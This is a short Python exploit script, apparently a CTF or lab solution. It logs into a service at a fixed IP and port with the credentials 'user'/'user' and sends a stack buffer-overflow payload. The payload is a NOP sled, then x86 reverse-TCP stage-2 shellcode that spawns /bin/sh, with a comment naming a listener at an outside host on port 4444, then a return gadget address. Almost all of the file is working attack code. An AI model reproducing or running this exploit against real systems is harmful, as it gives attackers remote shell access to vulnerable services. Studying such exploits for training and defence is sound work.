#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

ip = '10.211.55.48'
port = 8282

io = zio((ip, port), timeout=1000, print_write=COLORED(REPR))
io.read_until('login as: ')
io.writeline('user')
io.read_until('password: ')
io.writeline('user')
io.read_until('user@user$ ')

# linux/x86/shell/reverse_tcp - 36 bytes (stage 2)
# VERBOSE=false, LHOST=182.92.15.17, LPORT=4444
buf =  ""
buf += "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
buf += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
buf += "\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
shellcode = buf

gadget = 0x080485A1
#payload = shellcode.ljust(264, 'A') + l32(gadget) * 2
payload = '\x90'*(264-len(shellcode)) + shellcode + l32(gadget)*2

io.writeline(payload)
